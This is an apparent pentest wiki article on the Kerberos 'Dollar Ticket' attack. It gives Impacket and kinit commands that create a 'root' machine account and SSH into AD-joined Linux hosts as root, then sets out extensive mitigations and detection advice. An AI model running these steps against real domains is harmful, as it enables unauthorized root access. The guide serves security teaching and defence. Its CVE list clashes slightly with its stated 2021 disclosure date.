---
authors: bl4ckarch
category: ad
---

# Dollar Ticket Attack

## Theory

The Dollar Ticket Attack exploits name confusion vulnerabilities in Kerberos authentication within Active Directory environments. The attack leverages the behavior of machine accounts (which traditionally end with a `$` character) and the default principal-to-username mapping in MIT Kerberos implementations.

### Attack Principle

In Active Directory, machine accounts are created with a trailing dollar sign (e.g., `MACHINE$`). However, when Kerberos tickets are processed by certain services, particularly MIT-style Kerberos acceptors, the username mapping mechanism strips this trailing `$` character. This creates an opportunity for privilege escalation.

The core vulnerability stems from two key behaviors:

1. **MachineAccountQuota**: By default, Windows Active Directory allows authenticated users to create up to 10 machine accounts without special privileges through the `ms-DS-MachineAccountQuota` attribute
2. **Principal Name Mapping**: MIT-style Kerberos services map principals to local usernames by stripping the trailing `$`, effectively treating `root$` as `root`

### Attack Vectors

An attacker with standard domain user credentials can create a machine account named after a privileged local user (e.g., `root$`, `admin$`, `ubuntu$`) and then request a Kerberos ticket for that account. When presenting this ticket to MIT-style services running on Linux/Unix machines like SSH, the service maps the principal `root$@DOMAIN.COM` to the local `root` user, granting administrative access.

This attack specifically targets:

- Linux/Unix systems joined to Active Directory using SSSD, realm, or similar tools
- Services relying on default MIT Kerberos principal-to-username mapping
- Environments where PAC (Privilege Attribute Certificate) validation is not enforced
- SSH daemons configured with GSSAPI authentication

### Historical Context

The vulnerability was disclosed in November 2021 through multiple CVEs:

- **CVE-2020-25717**: Samba - A user in an AD Domain could become root on domain members
- **CVE-2020-25719**: Samba AD DC did not always rely on the SID and PAC in Kerberos tickets
- **CVE-2021-42287**: Microsoft - Authentication updates addressing privilege escalation
- **CVE-2022-26923**: Certifried - Related Active Directory privilege escalation vulnerability

## Practice

> [!WARNING]
> This attack requires the ability to create machine accounts in the target domain. Ensure proper authorization before testing in production environments.

### Prerequisites

The following conditions must be met for successful exploitation:

- Valid domain user credentials
- `MachineAccountQuota` set to a non-zero value (default is 10 on Windows AD)
- Target is a Linux/Unix machine joined to the AD domain
- Target system using MIT-style Kerberos authentication without proper PAC validation
- Privileged local account existing on the target (e.g., `root`, `administrator`, `ubuntu`)

### Exploitation Steps

The attack can be conducted from any system with Impacket tools and network access to the domain controller. The target must be a Linux/Unix machine joined to Active Directory.

```bash
# Obtain initial Kerberos ticket
kinit $USER

# Create machine account with privileged username (targeting 'root')
addcomputer.py -k -dc-host $DC_IP -computer-name 'root' -computer-pass 'ComplexPassword123!' "$DOMAIN/$USER"

# Alternative: Use LDAPS for account creation
addcomputer.py -debug -k -dc-host $DC_IP "$DOMAIN/$USER" -method LDAPS -computer-name root

# Request ticket for newly created machine account (note the trailing $)
kinit 'root$'

# Authenticate to target Linux/Unix service
ssh -o PreferredAuthentications=gssapi-with-mic -l root $TARGET
```

For environments requiring password authentication instead of Kerberos:

```bash
# Create machine account with password
addcomputer.py -dc-ip $DC_IP -computer-name 'root' -computer-pass 'ComplexPassword123!' "$DOMAIN/$USER:$PASSWORD"

# Request TGT for the machine account
getTGT.py "$DOMAIN/root\$:ComplexPassword123!" -dc-ip $DC_IP

# Export ticket for use
export KRB5CCNAME=root\$.ccache

# Authenticate to target
ssh -o PreferredAuthentications=gssapi-with-mic -l root $TARGET
```

> [!TIP]
> The machine account password must comply with domain password policy requirements. Use complex passwords with sufficient length, uppercase, lowercase, numbers, and special characters.

### Verification

After successful exploitation, verify access with:

```bash
# Check current user identity
whoami

# Verify Kerberos ticket
klist

# Test privileged access
id
sudo -l
```

### Cleanup

Remove the created machine account after testing:

```bash
# Using Impacket
addcomputer.py -delete -dc-ip $DC_IP -computer-name 'root' "$DOMAIN/$USER:$PASSWORD"
```

```powershell
# Using PowerShell
Remove-ADComputer -Identity "root" -Confirm:$false
```

## Mitigations

### Disable MachineAccountQuota

The most effective mitigation is to prevent unprivileged machine account creation by setting `MachineAccountQuota` to 0.

```bash
# Using ldapmodify
ldapmodify -H ldap://$DC_IP -D "$DOMAIN\Administrator" -W <<EOF
dn: DC=domain,DC=com
changetype: modify
replace: ms-DS-MachineAccountQuota
ms-DS-MachineAccountQuota: 0
EOF
```

```powershell
# Using PowerShell
Set-ADDomain -Identity $DOMAIN -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

Alternatively, restrict the `SeMachineAccountPrivilege` through Group Policy to limit which users can create machine accounts.

### Pre-create Privileged Accounts

Block the creation of sensitive usernames by pre-creating disabled accounts in Active Directory:

```bash
# Create disabled accounts for common privileged users
samba-tool user add root -H ldap://$DC_IP -U$USER%$PASSWORD --random-password
samba-tool user add admin -H ldap://$DC_IP -U$USER%$PASSWORD --random-password
samba-tool user add administrator -H ldap://$DC_IP -U$USER%$PASSWORD --random-password
samba-tool user add ubuntu -H ldap://$DC_IP -U$USER%$PASSWORD --random-password

# Disable the accounts
samba-tool user disable root -H ldap://$DC_IP -U$USER%$PASSWORD
```

Repeat this process for all system users with UID below 1000 and any privileged accounts specific to deployed applications.

### SSSD PAC Validation

For systems using SSSD 2.7 or later, enable PAC validation to verify ticket authenticity:

```ini
# /etc/sssd/sssd.conf
[domain/EXAMPLE.COM]
# Enable strict PAC checking
pac_check = pac_present, upn_dns_info_ex_present
```

The `pac_check` options enforce:

- `pac_present`: Requires PAC structure in all tickets
- `upn_dns_info_ex_present`: Requires UPN-DNS-INFO structure with consistent content

> [!NOTE]
> For full PAC validation when Dollar Ticket Attack mitigations are applied at AD level, the combination of `pac_present` and `upn_dns_info_ex_present` ensures that tickets must have PAC structures and that the UPN-DNS-INFO content is consistent with the rest of the PAC and the ticket. Additional options like `check_upn` and `check_upn_dns_info_ex` can be added based on security requirements.

> [!NOTE]
> PAC validation requires all users to have PAC issued, which is standard for Active Directory environments.

### MIT Kerberos Configuration

Disable the default authentication-to-local name translation plugin when using SSSD or Winbind plugins:

```ini
# /etc/krb5.conf.d/disable-localauth.conf
[plugins]
  localauth = {
    disable = an2ln
  }
```

> [!CAUTION]
> Disabling the default plugin should only be done in pure Active Directory environments, as it may break classic Kerberos setups expecting non-realm-based POSIX username mapping.

### OpenSSH Hardening

Prevent root login entirely to eliminate this attack vector for SSH access:

```bash
# /etc/ssh/sshd_config
PermitRootLogin no
```

This configuration forces users to authenticate with standard accounts and use `sudo` for privilege escalation, maintaining proper audit trails.

### Monitoring and Detection

Implement monitoring for suspicious machine account creation:

- Alert on machine accounts created by standard users
- Monitor for machine accounts with privileged usernames (e.g., `root$`, `admin$`)
- Detect Kerberos authentication patterns inconsistent with normal behavior
- Track `KRB_TGS_REQ` requests without corresponding `KRB_AS_REQ` events

## Resources

[https://wiki.samba.org/index.php/Security/Dollar_Ticket_Attack](https://wiki.samba.org/index.php/Security/Dollar_Ticket_Attack)

[https://web.mit.edu/kerberos/krb5-latest/doc/admin/host_config.html](https://web.mit.edu/kerberos/krb5-latest/doc/admin/host_config.html)

[https://bl4ckarch.github.io/posts/GOAD-DRACARYS](https://bl4ckarch.github.io/posts/GOAD-DRACARYS)